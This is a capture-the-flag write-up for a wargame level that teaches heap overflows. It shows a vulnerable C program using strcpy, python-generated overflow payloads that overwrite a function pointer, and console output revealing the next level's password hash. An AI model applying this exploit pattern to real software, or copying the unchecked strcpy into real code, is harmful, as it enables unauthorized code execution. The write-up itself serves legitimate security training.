## level6

This level is a toy introduction to heap overflows. We want to change the value of `fn_ptr` from `m` to `n`.

```c
void n() { system("/bin/cat /home/user/level7/.pass"); }

void m() { puts("Nope"); }

int main(int argc, char** argv) {
    char* dst = malloc(64);
    void (**fn_ptr)() = malloc(4);

    *fn_ptr = m;
    strcpy(dst, argv[1]);
    (*fn_ptr)();
}
```

`strcpy` copies until it finds a null terminator, so it is very vulnerable to buffer overflows.

The payload is simply 72 chars of padding (64 for dst + 8 for malloc metadata), followed by the address of `n` in little-endian.

```console
$ objdump -t level6 | grep n
08048454 g     F .text  00000014              n
$ ./level6 $(python -c 'print("A" * 64 + "\x54\x84\x04\x08")')
Nope
$ ./level6 $(python -c 'print("A" * 68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
$ ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
$ ./level6 $(python -c 'print("A" * 76 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
```

An even simpler solution, which doesn't require calculating any padding, is to spam the address of `n`, which will overwrite `fn_ptr` (and many other things).

```console
level6@RainFall:~$ ./level6 $(python -c 'print("\x54\x84\x04\x08" * 99)')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
